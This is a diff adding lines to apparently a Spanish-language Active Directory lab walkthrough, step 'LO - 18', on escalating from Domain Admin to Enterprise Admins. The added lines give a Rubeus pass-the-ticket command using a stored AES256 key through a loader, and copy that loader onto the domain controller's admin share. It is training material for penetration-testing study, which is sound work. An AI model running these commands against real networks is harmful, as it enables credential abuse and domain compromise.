@@ -1338,5 +1338,14 @@ winrs -r:dcorp-mgmt cmd
 
 *LO - 18*
 En este laboratorio aprovecharemos el acceso de *Domain Admin* para escalar a *Enterprise Admins* utilizando la clave de confianza del dominio
+Desde una CMD con privilegios de administrador
+```shell
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
 
+Y cargaremos el *Loader*
+```shell
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
+```
 
+Nos conectaremos a la maquina de *dcorp-dc* 
